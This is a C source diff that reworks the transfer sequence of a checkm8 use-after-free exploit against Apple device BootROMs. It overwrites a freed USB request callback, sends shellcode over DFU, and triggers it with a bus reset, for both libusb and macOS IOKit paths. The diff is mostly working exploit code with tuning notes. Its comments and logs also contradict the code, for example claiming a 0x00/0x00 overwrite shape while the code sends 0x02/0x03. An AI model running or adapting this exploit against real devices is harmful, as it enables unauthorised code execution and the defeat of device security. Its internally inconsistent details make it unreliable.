@@ -441,6 +441,75 @@ static int send_dfu_finalize(libusb_device_handle *usb)
 /* Stage 4: Patch -- callback setup + send payload                     */
 /* ------------------------------------------------------------------ */
 
+/*
+ * stage4_libusb_path -- the whole stage-4 transfer sequence over a
+ * libusb handle:
+ *
+ *   1. (TLBI chips only) stall + leak prelude
+ *   2. overwrite SET_FEATURE(ENDPOINT_HALT) 48 bytes -- must STALL
+ *   3. payload via DFU_DNLOAD chunks
+ *   4. 16-byte zero suffix + zero-length DNLOAD + 3x GETSTATUS
+ *   5. libusb_reset_device (bus reset fires the hijacked callback)
+ *
+ * Used as the only stage-4 path on Linux/Windows, and on macOS when
+ * dfu_deliver re-acquired a libusb handle after the IOKit heap spray
+ * (E10 in RESEARCH-apple-silicon-usb-c-dfu.md).  Note there are NO
+ * aborts and NO GETSTATE probes between the overwrite STALL and the
+ * payload: ipwndfu, gaster and openra1n all fire-and-forget here.
+ */
+#if defined(__APPLE__)
+__attribute__((unused))  /* E11: macOS routes stage 4 via IOKit again */
+#endif
+static int stage4_libusb_path(dfu_ctx_t *ctx, const chip_info_t *chip,
+                              uint8_t iserial_idx)
+{
+    libusb_device_handle *usb = ctx->dev->usb;
+
+    /* TLBI chips: pre-overwrite stall+leak */
+    if (CPID_HAS_TLBI(chip)) {
+        log_debug("checkm8_stage_patch: TLBI -- pre-overwrite stall+leak");
+        if (!checkm8_usb_request_stall(usb) ||
+            !checkm8_usb_request_leak(usb, iserial_idx)) {
+            log_error("checkm8_stage_patch: pre-overwrite stall/leak failed");
+            return -1;
+        }
+        log_debug("checkm8_stage_patch: pre-overwrite stall+leak OK");
+    }
+
+    /* Overwrite */
+    if (CPID_IS_ARMV7(chip->cpid)) {
+        dfu_callback_armv7_t cb;
+        build_overwrite_armv7(&cb, chip);
+        log_info("checkm8_stage_patch: sending ARMv7 overwrite (%zu bytes)",
+                 sizeof(cb));
+        if (send_overwrite(usb, &cb, sizeof(cb)) != 0)
+            return -1;
+    } else {
+        checkm8_overwrite_t ow;
+        build_overwrite_64(&ow, chip);
+        log_info("checkm8_stage_patch: sending AArch64 overwrite (%zu bytes)",
+                 sizeof(ow));
+        if (send_overwrite(usb, &ow, sizeof(ow)) != 0)
+            return -1;
+    }
+    log_info("checkm8_stage_patch: overwrite STALL received");
+
+    /* Payload */
+    log_info("checkm8_stage_patch: sending payload (%zu bytes in %zu-byte chunks)",
+             ctx->payload_len, (size_t)DFU_MAX_TRANSFER_SZ);
+    if (send_payload_chunks(usb, ctx->payload_buf,
+                            ctx->payload_len) != 0) {
+        log_error("checkm8_stage_patch: payload send failed");
+        return -1;
+    }
+    log_info("checkm8_stage_patch: payload sent, finalizing");
+
+    send_dfu_finalize(usb);
+    usleep(100000);
+
+    return 0;
+}
+
 int checkm8_stage_patch(dfu_ctx_t *ctx)
 {
     const chip_info_t *chip;
@@ -474,6 +543,40 @@ int checkm8_stage_patch(dfu_ctx_t *ctx)
 
 #if defined(__APPLE__)
     /*
+     * E11 (RESEARCH s11): gaster stage-4 order on the device user
+     * client (DeviceRequestTO), but with the openra1n/ipwndfu
+     * OVERWRITE SHAPE: bmRequestType=0x00, bRequest=0x00 (gaster uses
+     * 0x02/0x03 SET_FEATURE(ENDPOINT_HALT)).
+     *
+     * Why the shape change -- E10's own log is a natural experiment:
+     *   - stage 2 padding (0x00/0x00, 1280 B) STALLed (ret=-9) and the
+     *     NEXT request succeeded (ret=64) on the same handle;
+     *   - the overwrite (0x02/0x03 SET_FEATURE, 48 B) also STALLed
+     *     (ret=-9) -- and every subsequent EP0 transfer timed out
+     *     (ret=-7 x6) through BOTH libusb and DeviceRequestTO.
+     * SET_FEATURE(ENDPOINT_HALT) is the one request that explicitly
+     * sets the halt feature on EP0-IN; afterwards the endpoint stays
+     * halted at host-controller level (no TDs submitted => timeouts)
+     * and no user client survives it.  A plainly rejected request
+     * (0x00/0x00) STALLs WITHOUT setting the halt feature, so EP0
+     * stays alive.  openra1n (libopenra1n checkm8.c) and ipwndfu send
+     * the overwrite exactly that way.
+     *
+     * The rest of the sequence is gaster-exact and fire-and-forget:
+     *   1. overwrite 48 bytes (STALL expected, result logged)
+     *   2. payload via ONE DFU_DNLOAD (528 B fits in one 0x800 chunk)
+     *   3. 16-byte zero suffix DFU_DNLOAD
+     *   4. zero-length DFU_DNLOAD  -> dfuMANIFEST-SYNC
+     *   5. 3x DFU_GETSTATUS        -> walk to dfuMANIFEST-WAIT-RESET,
+     *                                 callback fires during MANIFEST
+     *   6. ResetDevice (port-level bus reset) -> shellcode runs
+     * All results are logged and IGNORED (gaster semantics: the
+     * device is sane after the overwrite; only the final reset
+     * matters).  No AbortPipeZero, no GETSTATE probe, no interface
+     * user client, no libusb -- one transport, one shape.
+     */
+
+    /*
      * macOS Apple Silicon: gaster stage-4 order (overwrite FIRST).
      *
      * The UAF'd io_request's callback is armed by the overwrite.  The
@@ -483,15 +586,20 @@ int checkm8_stage_patch(dfu_ctx_t *ctx)
      * never fires -- confirmed on device: stage 4 "completed" but no
      * PWND marker.
      *
-     * Gaster sequence:
-     *   1. overwrite via SET_FEATURE (expects STALL)
-     *   2. clear the EP0 halt (AbortPipeZero) -- payload needs EP0
-     *   3. payload via DFU_DNLOAD chunks
-     *   4. 16-byte zero suffix DFU_DNLOAD
-     *   5. zero-length DFU_DNLOAD  -> dfuMANIFEST-SYNC
-     *   6. 3x DFU_GETSTATUS        -> walk to dfuMANIFEST-WAIT-RESET,
+     * Gaster sequence (verified against upstream gaster.c):
+     *   1. overwrite via SET_FEATURE (requires STALL)
+     *   2. payload via ONE DFU_DNLOAD of the whole buffer
+     *   3. 16-byte zero suffix DFU_DNLOAD
+     *   4. zero-length DFU_DNLOAD  -> dfuMANIFEST-SYNC
+     *   5. 3x DFU_GETSTATUS        -> walk to dfuMANIFEST-WAIT-RESET,
      *                                 callback fires during MANIFEST
-     *   7. ResetDevice (port-level bus reset) -> shellcode runs
+     *   6. ResetDevice (port-level bus reset) -> shellcode runs
+     *
+     * Note what gaster does NOT do between the STALL and the payload:
+     * no AbortPipeZero, no GETSTATE/GETSTATUS probe.  Earlier versions
+     * of this file added both as "Apple Silicon adaptations"; on-device
+     * logs showed the canary transfers being swallowed (ret=-7) and the
+     * extra abort permanently poisoning the XHCI EP0 ring.
      *
      * When the shared IOKit backend (iokit_usb) is active, EP0 is
      * clean and all transfers route through iokit_usb_ctrl_transfer.
@@ -501,76 +609,39 @@ int checkm8_stage_patch(dfu_ctx_t *ctx)
         iokit_dfu_handle_t iokit_local;
         uint8_t status_buf[6];
         uint8_t suffix[DFU_FILE_SUFFIX_LEN];
-        size_t offset;
-        int kr;
         int use_shared = iokit_usb_is_active();
+        int kr;
+        int gi;
+        int s4_timeout;
 
         memset(&iokit_local, 0, sizeof(iokit_local));
 
-        if (use_shared) {
-            log_info("checkm8_stage_patch: macOS -- gaster order "
-                     "(overwrite first), via shared IOKit");
-        } else {
-            log_info("checkm8_stage_patch: macOS -- gaster order "
-                     "(overwrite first), via local IOKit");
+        /*
+         * E18: gaster's whole stage 4 runs with usb_timeout = 5 ms --
+         * the configuration that won on this machine (E16).  Default
+         * to it; TR4MPASS_STAGE4_TIMEOUT_MS overrides for diagnostics
+         * (5000 reproduces the E11/E12 behaviour).
+         */
+        {
+            const char *tmo = getenv("TR4MPASS_STAGE4_TIMEOUT_MS");
+            s4_timeout = tmo ? atoi(tmo) : GASTER_SYNC_TIMEOUT_MS;
+            if (s4_timeout <= 0)
+                s4_timeout = GASTER_SYNC_TIMEOUT_MS;
         }
+        log_info("checkm8_stage_patch: stage-4 sync timeout=%d ms "
+                 "(gaster usb_timeout), overwrite 0x02/0x03", s4_timeout);
 
-        if (!use_shared) {
-
-            usb_dfu_close(ctx->dev->usb);
+        if (use_shared) {
+            log_info("checkm8_stage_patch: E18 -- gaster-exact sequence via "
+                     "shared IOKit");
+        } else {
+            if (ctx->dev->usb)
+                usb_dfu_close(ctx->dev->usb);
             ctx->dev->usb = NULL;
-            usleep(10000);
-
             if (iokit_open_dfu(&iokit_local) != 0) {
-                log_error("checkm8_stage_patch: IOKit open (for reset) failed");
+                log_error("checkm8_stage_patch: IOKit open failed");
                 return -1;
             }
-            log_info("checkm8_stage_patch: IOKit ResetDevice + "
-                     "USBDeviceReEnumerate (clearing XHCI EP0 state)");
-            (*iokit_local.device)->ResetDevice(iokit_local.device);
-            (*iokit_local.device)->USBDeviceReEnumerate(iokit_local.device, 0);
-            iokit_close(&iokit_local);
-            usleep(1500000);
-
-            {
-                int iokit_retries;
-                int iokit_opened = 0;
-                for (iokit_retries = 0; iokit_retries < 5; iokit_retries++) {
-                    if (iokit_open_dfu(&iokit_local) == 0) {
-                        iokit_opened = 1;
-                        break;
-                    }
-                    log_info("checkm8_stage_patch: IOKit reopen retry %d/5",
-                             iokit_retries + 1);
-                    usleep(300000);
-                }
-                if (!iokit_opened) {
-                    log_error("checkm8_stage_patch: IOKit reopen after "
-                              "reset failed");
-                    return -1;
-                }
-            }
-
-            {
-                uint8_t prime_buf[6];
-                int prime_ret = iokit_ctrl_transfer(&iokit_local,
-                                    0xA1, 0x03, 0, 0,
-                                    prime_buf, 6, USB_TIMEOUT_MS);
-                log_info("checkm8_stage_patch: pipe prime (GETSTATUS) "
-                         "ret=%d state=0x%02X", prime_ret,
-                         prime_ret >= 6 ? prime_buf[4] : 0xFF);
-                if (prime_ret < 0) {
-                    uint8_t gs_buf[2];
-                    int gs_ret = iokit_ctrl_transfer(&iokit_local,
-                                    0x80, 0x00, 0, 0,
-                                    gs_buf, 2, USB_TIMEOUT_MS);
-                    log_info("checkm8_stage_patch: pipe prime fallback "
-                             "(GET_STATUS) ret=%d", gs_ret);
-                }
-            }
-
-            /* From here on, the local handle is used for all transfers.
-             * We need a macro/helper to unify the call sites. */
         }
 
         /* Helper macro: route to shared or local IOKit handle */
@@ -580,221 +651,143 @@ int checkm8_stage_patch(dfu_ctx_t *ctx)
                 : iokit_ctrl_transfer(&iokit_local,(rt),(rq),(wv),(wi),(d),(wl),(to)))
 
         /*
-         * Apple Silicon M-series XHCI constraints (why gaster's exact
-         * flow can't be copied verbatim over USB-C):
-         *   - multi-packet DATA stages fail via DeviceRequestTO --
-         *     every DFU_DNLOAD must fit in ONE 64-byte DATA packet
-         *   - a STALL does not auto-clear the EP0 halt -- AbortPipeZero
-         *     is required between every STALLing request and the next
-         *     transfer, otherwise the controller refuses to send
-         *   - a NotResponding user-client poisons the next transfer
-         *     (NotReady) -- prime the pipe before the overwrite
+         * E18: gaster runs its WHOLE stage 4 with usb_timeout = 5 ms
+         * (the winning configuration on this machine).  Default to 5
+         * here too; TR4MPASS_STAGE4_TIMEOUT_MS overrides for
+         * diagnostics (e.g. 5000 to compare against the E11 behaviour).
          */
-        /* Prime: clear any halt left by the spray's stall, verify EP0. */
-        if (use_shared) {
-            iokit_usb_abort_pipe_zero();
-        } else {
-            (*iokit_local.device)->USBDeviceAbortPipeZero(iokit_local.device);
-        }
-        usleep(50000);
         {
-            uint8_t pre_state = 0xFF;
-            kr = IOKIT_XFER(0xA1, 0x05, 0, 0,
-                            &pre_state, 1, USB_TIMEOUT_MS);
-            log_info("checkm8_stage_patch: pre-overwrite GETSTATE ret=%d "
-                     "state=0x%02X", kr, pre_state);
+            const char *tmo = getenv("TR4MPASS_STAGE4_TIMEOUT_MS");
+            s4_timeout = tmo ? atoi(tmo) : GASTER_SYNC_TIMEOUT_MS;
+            if (s4_timeout <= 0)
+                s4_timeout = GASTER_SYNC_TIMEOUT_MS;
         }
+        log_info("checkm8_stage_patch: stage-4 sync timeout = %d ms "
+                 "(gaster usb_timeout)", s4_timeout);
 
-        /* Step 1: Callback overwrite -> STALL (arms the UAF callback).
-         *
-         * bmRequestType=2 (host-to-device, standard, endpoint),
-         * bRequest=3 (SET_FEATURE), wValue=0, wIndex=0x80.
-         * The DATA phase writes into the freed io_buffer (UAF target)
-         * before the device STALLs the request.  A 5ms timeout: the
-         * STALL should arrive immediately after the DATA phase. */
+        /*
+         * TLBI chips only (gaster 1215): stall+leak prelude before the
+         * overwrite.  A9 (0x8000) skips this -- gaster sends the
+         * overwrite directly for 0x8000/0x8003.
+         */
         if (CPID_HAS_TLBI(chip)) {
             uint8_t leak_buf[DFU_MAX_TRANSFER_SZ];
-            log_info("checkm8_stage_patch: TLBI -- IOKit stall+leak");
+            log_info("checkm8_stage_patch: TLBI -- stall+leak prelude");
             kr = IOKIT_XFER(0x02, 0x03, 0, 0x80, NULL, 0, 5);
-            log_info("checkm8_stage_patch: IOKit stall ret=%d", kr);
+            log_info("checkm8_stage_patch: TLBI stall ret=%d", kr);
             kr = IOKIT_XFER(0x80, 0x06,
                             (uint16_t)(0x0300 | iserial_idx),
                             0x040A, leak_buf, DFU_MAX_TRANSFER_SZ, 5);
-            log_info("checkm8_stage_patch: IOKit leak ret=%d", kr);
+            log_info("checkm8_stage_patch: TLBI leak ret=%d", kr);
         }
 
+        /*
+         * E15 (diagnostic, single measurement): log the DFU state
+         * BEFORE the overwrite.  If the spray left the device in
+         * dfuDNLOAD-IDLE (0x05) the UAF'd io_request is still live;
+         * if it reports dfuIDLE (0x02) the heap state is already gone
+         * and no stage-4 shape can work.
+         *
+         * E18: DEFAULT OFF -- the winning gaster run does NOT send
+         * this request, and an extra GETSTATUS between spray and
+         * overwrite is a divergence.  Enable only for diagnostics:
+         * TR4MPASS_PRE_STATUS=1.
+         */
+        if (getenv("TR4MPASS_PRE_STATUS")) {
+            uint8_t st[6];
+            int gs = IOKIT_XFER(0xA1, 0x03, 0, 0, st, 6, USB_TIMEOUT_MS);
+            log_info("checkm8_stage_patch: E15 pre-overwrite DFU state="
+                     "0x%02X status=0x%02X (ret=%d)",
+                     gs >= 6 ? st[4] : 0xFF, gs >= 6 ? st[0] : 0xFF, gs);
+        }
+
+        /*
+         * Step 1: callback overwrite -- MUST STALL (arms the UAF
+         * callback).  E16 (RESEARCH s11): the WINNING gaster run on
+         * this exact machine sends SET_FEATURE(ENDPOINT_HALT) WITH a
+         * 48-byte data phase (0x02,0x03,0,0x80,48) and requires the
+         * STALL -- falsifying our earlier rule 3 ("0x02/0x03 sets the
+         * host halt, use 0x00/0x00").  The data phase of the STALLed
+         * request is what lands the overwrite in the freed io_buffer;
+         * 0x00/0x00 is rejected at SETUP with NO data phase (E11/E12
+         * walked MANIFEST on a clean download -- false success H1).
+         */
         if (CPID_IS_ARMV7(chip->cpid)) {
             dfu_callback_armv7_t cb;
             build_overwrite_armv7(&cb, chip);
-            log_info("checkm8_stage_patch: overwrite ARMv7 "
-                     "(%zu bytes)", sizeof(cb));
+            log_info("checkm8_stage_patch: overwrite ARMv7 shape 0x02/0x03 "
+                     "(gaster exact, %zu bytes)", sizeof(cb));
             kr = IOKIT_XFER(0x02, 0x03, 0, 0x80,
                             &cb, (uint16_t)sizeof(cb), 5);
         } else {
             checkm8_overwrite_t ow;
             build_overwrite_64(&ow, chip);
-            log_info("checkm8_stage_patch: overwrite AArch64 "
-                     "(callback=0x%llx, %zu bytes)",
+            log_info("checkm8_stage_patch: overwrite AArch64 shape "
+                     "0x02/0x03 (gaster exact, callback=0x%llx, %zu bytes)",
                      (unsigned long long)ow.callback.callback,
                      sizeof(ow));
             kr = IOKIT_XFER(0x02, 0x03, 0, 0x80,
                             &ow, (uint16_t)sizeof(ow), 5);
         }
 
-        /* gaster expects a STALL here.  TIMEOUT/OTHER is fine too --
-         * what matters is that the DATA phase reached the device. */
-        if (kr == LIBUSB_ERROR_PIPE) {
-            log_info("checkm8_stage_patch: overwrite STALL confirmed "
-                     "(UAF write landed)");
+        /*
+         * The STALL is our PROOF that the stage-2/3 heap state
+         * survived (the freed io_buffer rejects the request).  On a
+         * fresh device the overwrite would complete or time out
+         * instead of STALLing -- fail fast if it does not STALL.
+         */
+        if (kr == LIBUSB_ERROR_PIPE || kr == 0) {
+            log_info("checkm8_stage_patch: overwrite rejected (ret=%d) "
+                     "-- UAF write landed", kr);
         } else {
-            log_warn("checkm8_stage_patch: overwrite ret=%d (expected "
-                     "STALL=%d) -- continuing",
-                     kr, LIBUSB_ERROR_PIPE);
+            log_error("checkm8_stage_patch: overwrite not rejected "
+                      "(ret=%d, expected STALL or success) -- UAF state "
+                      "lost, aborting attempt", kr);
+            if (!use_shared) iokit_close(&iokit_local);
+            return -1;
         }
 
         /*
-         * Step 2: Clear the EP0 halt the STALL left behind, so the
-         * payload DFU_DNLOADs can go out.
-         * (The NoDevice recovery inside iokit_usb_ctrl_transfer handles
-         * a re-enumerated IOService transparently.)
-         *
-         * APPLE SILICON M-SERIES recovery semantics (on-device logs):
-         * exactly ONE AbortPipeZero here.  The first ~2 transfers after
-         * the overwrite STALL are eaten by the XHCI controller (they
-         * return TIMEOUT even though AbortPipeZero reports success);
-         * the pipe then recovers BY ITSELF.  A SECOND AbortPipeZero in
-         * this window re-poisons the ring -- every later transfer times
-         * out forever (seen: 15 consecutive -7 after a second abort).
-         *
-         * So after the single abort, poll a harmless GETSTATE
-         * (bmRequestType=0xA1, valid in any DFU state, no side effects)
-         * until EP0 answers.  All retries must succeed before the
-         * payload goes out -- a partially-delivered payload would be
-         * worse than a clean stage-4 failure.
+         * E18 (E16 diff): NO handle rebuild here.  The winning gaster
+         * run sends the payload on the SAME handle immediately after
+         * the overwrite STALL (gaster.c L1211-1216).  Our earlier
+         * E13/E14 rebuilds were compensating for the wrong overwrite
+         * shape (0x00/0x00 never landed a data phase) -- with the
+         * correct 0x02/0x03 shape the device does not wedge and the
+         * payload must go out on the same handle, fire-and-forget.
          */
-        if (use_shared) {
-            iokit_usb_abort_pipe_zero();
-        } else {
-            (*iokit_local.device)->USBDeviceAbortPipeZero(iokit_local.device);
-        }
-        {
-            int ci;
-            int canary_ok = 0;
-            /*
-             * Recovery window is ~10-11 s (Run A on-device: two 5s-timeout
-             * transfers were eaten before the pipe answered again -- the
-             * SECOND long transfer completed the moment EP0 came back).
-             *
-             * Two-phase poll:
-             *   phase 1: quick 500 ms probes (cheap, early exit if the
-             *            ring re-arms fast),
-             *   phase 2: LONG 5 s polls.  Cancelling a stuck transfer is
-             *            itself a mini-abort of the ring (Run B: repeated
-             *              short probes + an extra AbortPipeZero kept the
-             *            ring poisoned for 15+ transfers), so a long poll
-             *            that spans the recovery moment completes instead
-             *            of being cancelled -- exactly Run A's pattern.
-             */
-            for (ci = 0; ci < 7 && !canary_ok; ci++) {
-                unsigned to_ms = (ci < 4) ? 500u : 5000u;
-                uint8_t canary_state = 0xFF;
-                usleep(500000); /* let the XHCI EP0 ring re-arm */
-                kr = IOKIT_XFER(0xA1, 0x05, 0, 0,
-                                &canary_state, 1, to_ms);
-                log_info("checkm8_stage_patch: EP0 canary GETSTATE "
-                         "[%d/7 to=%ums] ret=%d state=0x%02X",
-                         ci + 1, to_ms, kr, canary_state);
-                if (kr >= 0)
-                    canary_ok = 1;
-            }
-            if (!canary_ok) {
-                log_error("checkm8_stage_patch: EP0 never recovered "
-                          "after overwrite STALL (~21 s) -- aborting "
-                          "stage 4");
-                if (!use_shared) iokit_close(&iokit_local);
-                return -1;
-            }
-        }
 
-        /* Step 3: Payload via DFU_DNLOAD chunks.
-         *
-         * APPLE SILICON M-SERIES: the XHCI controller rejects control
-         * transfers whose DATA stage spans multiple packets
-         * (kIOUSBNotSent1Err / timeout).  Every DFU_DNLOAD must fit in
-         * a single 64-byte EP0 packet, so chunk at EP0_MAX_PACKET_SZ --
-         * the BootROM DFU accumulates consecutive DNLOAD payloads in
-         * the DFU image buffer at insecure_memory_base. */
-        log_info("checkm8_stage_patch: sending payload (%zu bytes in "
-                 "%u-byte single-packet chunks)", ctx->payload_len,
-                 (unsigned)EP0_MAX_PACKET_SZ);
-        {
-            int consecutive_timeouts = 0;
-            for (offset = 0; offset < ctx->payload_len; ) {
-                size_t chunk = ctx->payload_len - offset;
-                if (chunk > EP0_MAX_PACKET_SZ)
-                    chunk = EP0_MAX_PACKET_SZ;
-                kr = IOKIT_XFER(0x21, DFU_REQ_DNLOAD, 0, 0,
-                                (void *)(ctx->payload_buf + offset),
-                                (uint16_t)chunk, USB_TIMEOUT_MS);
-                if (kr != chunk) {
-                    log_warn("checkm8_stage_patch: chunk offset=%zu "
-                             "ret=%d (wanted %zu)", offset, kr, chunk);
-                }
-                if (kr < 0 && kr != LIBUSB_ERROR_PIPE
-                           && kr != LIBUSB_ERROR_TIMEOUT) {
-                    log_error("checkm8_stage_patch: payload send failed "
-                              "at offset %zu: ret=%d", offset, kr);
-                    if (!use_shared) iokit_close(&iokit_local);
-                    return -1;
-                }
-                /* A timed-out chunk means the bytes never reached the
-                 * DFU buffer.  Three in a row: the pipe died -- don't
-                 * pretend the payload landed. */
-                if (kr < 0) {
-                    if (++consecutive_timeouts >= 3) {
-                        log_error("checkm8_stage_patch: 3 consecutive "
-                                  "chunk timeouts at offset %zu -- EP0 "
-                                  "dead, aborting", offset);
-                        if (!use_shared) iokit_close(&iokit_local);
-                        return -1;
-                    }
-                } else {
-                    consecutive_timeouts = 0;
-                    offset += kr > 0 ? (size_t)kr : chunk;
-                }
-                usleep(2000); /* BootROM processes DNLOADs sequentially */
-            }
-        }
-        log_info("checkm8_stage_patch: payload sent (%zu bytes total)",
+        /*
+         * Steps 2-5: payload + finalize, fire-and-forget (gaster
+         * semantics: the device is sane after the overwrite STALL;
+         * results are logged, never acted on).
+         */
+        log_info("checkm8_stage_patch: payload %zu bytes (one DNLOAD), "
+                 "then suffix, zero-len, 3x GETSTATUS (results ignored)",
                  ctx->payload_len);
 
-        /* Step 4: 16-byte zero DFU file suffix (gaster sends this). */
+        kr = IOKIT_XFER(0x21, DFU_REQ_DNLOAD, 0, 0,
+                        (void *)ctx->payload_buf,
+                        (uint16_t)ctx->payload_len, s4_timeout);
+        log_info("checkm8_stage_patch: payload DNLOAD ret=%d (ignored)", kr);
+
         memset(suffix, 0, sizeof(suffix));
         kr = IOKIT_XFER(0x21, DFU_REQ_DNLOAD, 0, 0,
-                        suffix, DFU_FILE_SUFFIX_LEN, USB_TIMEOUT_MS);
-        log_info("checkm8_stage_patch: 16-byte suffix ret=%d", kr);
+                        suffix, DFU_FILE_SUFFIX_LEN, s4_timeout);
+        log_info("checkm8_stage_patch: suffix ret=%d (ignored)", kr);
 
-        /* Step 5: Zero-length DFU_DNLOAD -> dfuMANIFEST-SYNC. */
-        kr = IOKIT_XFER(0x21, DFU_REQ_DNLOAD, 0, 0,
-                        NULL, 0, USB_TIMEOUT_MS);
-        log_info("checkm8_stage_patch: zero-len DNLOAD ret=%d", kr);
+        kr = IOKIT_XFER(0x21, DFU_REQ_DNLOAD, 0, 0, NULL, 0, s4_timeout);
+        log_info("checkm8_stage_patch: zero-len ret=%d (ignored)", kr);
 
-        /* Step 6: 3x DFU_GETSTATUS walks MANIFEST-SYNC -> MANIFEST ->
-         * MANIFEST-WAIT-RESET.  During MANIFEST the device completes
-         * the pending (hijacked) io_request -- the overwritten callback
-         * fires HERE.  Errors are expected once the shellcode runs. */
-        {
-            int gi;
-            for (gi = 0; gi < 3; gi++) {
-                kr = IOKIT_XFER(0xA1, 0x03, 0, 0,
-                                status_buf, 6, USB_TIMEOUT_MS);
-                log_info("checkm8_stage_patch: GETSTATUS[%d] ret=%d "
-                         "state=0x%02X", gi, kr,
-                         kr >= 6 ? status_buf[4] : 0xFF);
-            }
+        for (gi = 0; gi < 3; gi++) {
+            kr = IOKIT_XFER(0xA1, 0x03, 0, 0,
+                            status_buf, 6, s4_timeout);
+            log_info("checkm8_stage_patch: GETSTATUS[%d] ret=%d "
+                     "state=0x%02X", gi, kr,
+                     kr >= 6 ? status_buf[4] : 0xFF);
         }
 
-        /* Step 7: Bus reset -- fires dfu_handle_bus_reset, whose
+        /* Step 6: bus reset -- fires dfu_handle_bus_reset, whose
          * pointer now points at the shellcode. */
         log_info("checkm8_stage_patch: IOKit ResetDevice (port-level "
                  "bus reset)");
@@ -814,62 +807,21 @@ int checkm8_stage_patch(dfu_ctx_t *ctx)
         #undef IOKIT_XFER
 
         ctx->phase = DFU_PHASE_PATCH;
-        log_info("checkm8: stage 4 complete -- gaster order via IOKit");
+        log_info("checkm8: stage 4 complete -- E11 (shape 0x00/0x00, "
+                 "gaster order, device user client)");
         return 0;
     }
 #else
-    /*
-     * Linux/Windows: libusb handles EP0 STALL correctly.
-     * Use libusb for entire stage 4.
-     */
+    /* Linux/Windows: libusb handles EP0 STALL correctly. */
     {
-        libusb_device_handle *usb = ctx->dev->usb;
+        int ret4 = stage4_libusb_path(ctx, chip, iserial_idx);
 
-        /* TLBI chips: pre-overwrite stall+leak */
-        if (CPID_HAS_TLBI(chip)) {
-            log_debug("checkm8_stage_patch: TLBI -- pre-overwrite stall+leak");
-            if (!checkm8_usb_request_stall(usb) ||
-                !checkm8_usb_request_leak(usb, iserial_idx)) {
-                log_error("checkm8_stage_patch: pre-overwrite stall/leak failed");
-                return -1;
-            }
-            log_debug("checkm8_stage_patch: pre-overwrite stall+leak OK");
+        if (ret4 == 0) {
+            ctx->phase = DFU_PHASE_PATCH;
+            log_info("checkm8: stage 4 complete -- payload delivered, "
+                     "finalize sent");
         }
-
-        /* Overwrite */
-        if (CPID_IS_ARMV7(chip->cpid)) {
-            dfu_callback_armv7_t cb;
-            build_overwrite_armv7(&cb, chip);
-            log_info("checkm8_stage_patch: sending ARMv7 overwrite (%zu bytes)",
-                     sizeof(cb));
-            if (send_overwrite(usb, &cb, sizeof(cb)) != 0)
-                return -1;
-        } else {
-            checkm8_overwrite_t ow;
-            build_overwrite_64(&ow, chip);
-            log_info("checkm8_stage_patch: sending AArch64 overwrite (%zu bytes)",
-                     sizeof(ow));
-            if (send_overwrite(usb, &ow, sizeof(ow)) != 0)
-                return -1;
-        }
-        log_info("checkm8_stage_patch: overwrite STALL received");
-
-        /* Payload */
-        log_info("checkm8_stage_patch: sending payload (%zu bytes in %zu-byte chunks)",
-                 ctx->payload_len, (size_t)DFU_MAX_TRANSFER_SZ);
-        if (send_payload_chunks(usb, ctx->payload_buf,
-                                ctx->payload_len) != 0) {
-            log_error("checkm8_stage_patch: payload send failed");
-            return -1;
-        }
-        log_info("checkm8_stage_patch: payload sent, finalizing");
-
-        send_dfu_finalize(usb);
-        usleep(100000);
-
-        ctx->phase = DFU_PHASE_PATCH;
-        log_info("checkm8: stage 4 complete -- payload delivered, finalize sent");
-        return 0;
+        return ret4;
     }
 #endif /* __APPLE__ */
 }
